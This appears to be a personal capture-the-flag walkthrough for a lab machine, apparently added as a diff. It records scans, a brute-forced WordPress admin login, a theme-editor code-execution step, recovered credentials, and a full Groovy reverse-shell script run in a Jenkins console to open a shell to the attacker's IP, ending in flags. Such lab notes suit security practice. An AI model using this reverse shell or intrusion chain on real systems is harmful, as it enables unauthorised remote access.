@@ -1,0 +1,220 @@
+pepene
+
+└─$ nmap -A -p- -T4 10.10.40.21
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-30 09:25 GMT
+Nmap scan report for 10.10.40.21
+Host is up (0.034s latency).
+Not shown: 65533 closed tcp ports (conn-refused)
+PORT   STATE SERVICE    VERSION
+22/tcp open  ssh        OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 6e:fa:ef:be:f6:5f:98:b9:59:7b:f7:8e:b9:c5:62:1e (RSA)
+|   256 ed:64:ed:33:e5:c9:30:58:ba:23:04:0d:14:eb:30:e9 (ECDSA)
+|_  256 b0:7f:7f:7b:52:62:62:2a:60:d4:3d:36:fa:89:ee:ff (ED25519)
+80/tcp open  tcpwrapped
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 63.24 seconds
+
+ ___  ___  __   __     __      __         __   ___
+|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
+|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
+by Ben "epi" Risher 🤓                 ver: 2.11.0
+───────────────────────────┬──────────────────────
+ 🎯  Target Url            │ http://10.10.40.21/
+ 🚀  Threads               │ 200
+ 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-big.txt
+ 👌  Status Codes          │ All Status Codes!
+ 💥  Timeout (secs)        │ 7
+ 🦡  User-Agent            │ feroxbuster/2.11.0
+ 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
+ 🔎  Extract Links         │ true
+ 🏁  HTTP methods          │ [GET]
+ 🔃  Recursion Depth       │ 4
+───────────────────────────┴──────────────────────
+ 🏁  Press [ENTER] to use the Scan Management Menu™
+──────────────────────────────────────────────────
+301      GET        9l       28w      309c http://10.10.40.21/blog => http://10.10.40.21/blog/                        301      GET        9l       28w      314c http://10.10.40.21/wordpress => http://10.10.40.21/wordpress/              301      GET        9l       28w      315c http://10.10.40.21/javascript => http://10.10.40.21/javascript/            200      GET       15l       74w     6147c http://10.10.40.21/icons/ubuntu-logo.png                                   200      GET      375l      964w    10918c http://10.10.40.21/                                                        301      GET        9l       28w      325c http://10.10.40.21/wordpress/wp-content => http://10.10.40.21/wordpress/wp-content/301      GET        9l       28w      320c http://10.10.40.21/blog/wp-content => http://10.10.40.21/blog/wp-content/  301      GET        9l       28w      321c http://10.10.40.21/blog/wp-includes => http://10.10.40.21/blog/wp-includes/301      GET        9l       28w      327c http://10.10.40.21/blog/wp-content/themes => http://10.10.40.21/blog/wp-content/themes/301      GET        9l       28w      328c http://10.10.40.21/blog/wp-includes/images => http://10.10.40.21/blog/wp-includes/images/301      GET        9l       28w      326c http://10.10.40.21/wordpress/wp-includes => http://10.10.40.21/wordpress/wp-includes/301      GET        9l       28w      336c http://10.10.40.21/blog/wp-includes/images/smilies => http://10.10.40.21/blog/wp-includes/images/smilies/301      GET        9l       28w      333c http://10.10.40.21/wordpress/wp-includes/images => http://10.10.40.21/wordpress/wp-includes/images/301      GET        9l       28w      339c http://10.10.40.21/wordpress/wp-includes/images/media => http://10.10.40.21/wordpress/wp-includes/images/media/301      GET        9l       28w      328c http://10.10.40.21/blog/wp-content/uploads => http://10.10.40.21/blog/wp-content/uploads/301      GET        9l       28w      325c http://10.10.40.21/blog/wp-includes/css => http://10.10.40.21/blog/wp-includes/css/301      GET        9l       28w      324c http://10.10.40.21/blog/wp-includes/js => http://10.10.40.21/blog/wp-includes/js/[#############>------] - 2m   11488620/16593411 20s     found:17      erro[#############>------] - 2m   11494896/16593411 13s     found:17      errors:11390954
+[###############>----] - 2m    943014/1185240 7893/s  http://10.10.40.21/ 
+[###############>----] - 2m    900573/1185240 7594/s  http://10.10.40.21/blog/ 
+[##############>-----] - 2m    831308/1185240 7150/s  http://10.10.40.21/wordpress/ 
+[##############>-----] - 2m    856310/1185240 7455/s  http://10.10.40.21/javascript/ 
+[############>-------] - 2m    728061/1185240 6525/s  http://10.10.40.21/wordpress/wp-content/ 
+[############>-------] - 2m    751966/1185240 6776/s  http://10.10.40.21/blog/wp-content/ 
+[##############>-----] - 2m    865516/1185240 7797/s  http://10.10.40.21/blog/wp-includes/ 
+[##############>-----] - 2m    868678/1185240 7922/s  http://10.10.40.21/blog/wp-content/themes/ 
+[###########>--------] - 2m    699853/1185240 6351/s  http://10.10.40.21/blog/wp-content/uploads/ 
+[##############>-----] - 2m    831595/1185240 7609/s  http://10.10.40.21/blog/wp-includes/images/ 
+[#############>------] - 2m    813166/1185240 7403/s  http://10.10.40.21/blog/wp-includes/css/ 
+[##############>-----] - 2m    850488/1185240 7826/s  http://10.10.40.21/wordpress/wp-includes/ 
+[##############>-----] - 2m    834579/1185240 7615/s  http://10.10.40.21/wordpress/wp-includes/images/ 
+[#############>------] - 2m    800161/1185240 7756/s  http://10.10.40.21/blog/wp-includes/js/ 
+
+└─$ wpscan --url http://timetime.thm/wordpress
+_______________________________________________________________
+         __          _______   _____
+         \ \        / /  __ \ / ____|
+          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
+           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
+            \  /\  /  | |     ____) | (__| (_| | | | |
+             \/  \/   |_|    |_____/ \___|\__,_|_| |_|
+
+         WordPress Security Scanner by the WPScan Team
+                         Version 3.8.27
+       Sponsored by Automattic - https://automattic.com/
+       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
+_______________________________________________________________
+
+[+] URL: http://timetime.thm/wordpress/ [10.10.40.21]
+[+] Started: Wed Oct 30 09:48:14 2024
+
+Interesting Finding(s):
+
+[+] Headers
+ | Interesting Entry: Server: Apache/2.4.29 (Ubuntu)
+ | Found By: Headers (Passive Detection)
+ | Confidence: 100%
+
+[+] XML-RPC seems to be enabled: http://timetime.thm/wordpress/xmlrpc.php
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 100%
+ | References:
+ |  - http://codex.wordpress.org/XML-RPC_Pingback_API
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
+ |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/
+
+[+] WordPress readme found: http://timetime.thm/wordpress/readme.html
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 100%
+
+[+] The external WP-Cron seems to be enabled: http://timetime.thm/wordpress/wp-cron.php
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 60%
+ | References:
+ |  - https://www.iplocation.net/defend-wordpress-from-ddos
+ |  - https://github.com/wpscanteam/wpscan/issues/1299
+
+[+] WordPress version 5.4.2 identified (Insecure, released on 2020-06-10).
+ | Found By: Rss Generator (Passive Detection)
+ |  - http://timetime.thm/blog/index.php/feed/, <generator>https://wordpress.org/?v=5.4.2</generator>
+ |  - http://timetime.thm/blog/index.php/comments/feed/, <generator>https://wordpress.org/?v=5.4.2</generator>
+
+[+] WordPress theme in use: twentyseventeen
+ | Location: http://timetime.thm/wordpress/wp-content/themes/twentyseventeen/
+ | Last Updated: 2024-07-16T00:00:00.000Z
+ | Readme: http://timetime.thm/wordpress/wp-content/themes/twentyseventeen/readme.txt
+ | [!] The version is out of date, the latest version is 3.7
+ | Style URL: http://timetime.thm/blog/wp-content/themes/twentyseventeen/style.css?ver=20190507
+ | Style Name: Twenty Seventeen
+ | Style URI: https://wordpress.org/themes/twentyseventeen/
+ | Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a fo...
+ | Author: the WordPress team
+ | Author URI: https://wordpress.org/
+ |
+ | Found By: Css Style In Homepage (Passive Detection)
+ |
+ | Version: 2.3 (80% confidence)
+ | Found By: Style (Passive Detection)
+ |  - http://timetime.thm/blog/wp-content/themes/twentyseventeen/style.css?ver=20190507, Match: 'Version: 2.3'
+
+[+] Enumerating All Plugins (via Passive Methods)
+
+[i] No plugins Found.
+
+[+] Enumerating Config Backups (via Passive and Aggressive Methods)
+ Checking Config Backups - Time: 00:00:01 <=======================================> (137 / 137) 100.00% Time: 00:00:01
+
+[i] No Config Backups Found.
+
+[!] No WPScan API Token given, as a result vulnerability data has not been output.
+[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register
+
+[+] Finished: Wed Oct 30 09:48:19 2024
+[+] Requests Done: 172
+[+] Cached Requests: 5
+[+] Data Sent: 38.706 KB
+[+] Data Received: 372.332 KB
+[+] Memory used: 272.578 MB
+[+] Elapsed time: 00:00:05
+
+
+[!] Valid Combinations Found:
+ | Username: admin, Password: romania
+ 
+ └─$ gobuster dir -u timetime.thm/wordpress -t 50 -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt -x txt,php,js
+===============================================================
+Gobuster v3.6
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://timetime.thm/wordpress
+[+] Method:                  GET
+[+] Threads:                 50
+[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-1.0.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.6
+[+] Extensions:              txt,php,js
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+/.php                 (Status: 403) [Size: 277]
+/index.php            (Status: 301) [Size: 0] [--> http://timetime.thm/blog/]
+/license.txt          (Status: 200) [Size: 19915]
+/wp-content           (Status: 301) [Size: 327] [--> http://timetime.thm/wordpress/wp-content/]
+/wp-admin             (Status: 301) [Size: 325] [--> http://timetime.thm/wordpress/wp-admin/]
+/xmlrpc.php           (Status: 405) [Size: 42]
+/wp-trackback.php     (Status: 200) [Size: 135]
+/wp-login.php         (Status: 200) [Size: 4530]
+ 
+ change the 404.php Apparences => Theme Editor
+ 
+ 10.10.40.21/wordpress/wp-content/themes/twentyseventeen/404.php
+
+cat squeezie/user.txt : EPI{_SuN7_F3r1C1t_c4_M4n4Nc_1_P3p3N3_}
+
+www-data@timetime:/opt$ cat wp-save.txt
+cat wp-save.txt
+Myd,
+
+Squeezie avea nevoie de aceste acreditări pentru ceva mai târziu. Spune-i că le ai și unde sunt.
+
+time_time_best_single
+
+ss -tulpn
+
+Netid      State        Recv-Q       Send-Q                 Local Address:Port                Peer Address:Port       
+udp        UNCONN       0            0                      127.0.0.53%lo:53                       0.0.0.0:*          
+udp        UNCONN       0            0                   10.10.40.21%eth0:68                       0.0.0.0:*          
+tcp        LISTEN       0            128                    127.0.0.53%lo:53                       0.0.0.0:*          
+tcp        LISTEN       0            128                          0.0.0.0:22                       0.0.0.0:*          
+tcp        LISTEN       0            128                        127.0.0.1:45855                    0.0.0.0:*          
+tcp        LISTEN       0            80                         127.0.0.1:3306                     0.0.0.0:*          
+tcp        LISTEN       0            128                        127.0.0.1:8080                     0.0.0.0:*          
+tcp        LISTEN       0            128                             [::]:22                          [::]:*          
+tcp        LISTEN       0            128                                *:80                             *:*  
+
+
+└─$ ssh -L 8080:localhost:8080 squeezie@10.10.40.21
+
+localhost:8080 => jenkins session
+
+jenkins creds : admin : spongebob
+
+in the console Script
+
+String host="10.21.78.142";
+int port=4445;
+String cmd="bash";
+Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
+
+shell as jenkins
+
+cat /opt/note.txt
+
+ssh root@<IP> : ambiance_skandal_tu_connais_deja
+
+cat /root/root.txt
+EPI{D4nS4M_1n_T1m3_t1Me_4S4_C4_By3_bY3_By3}
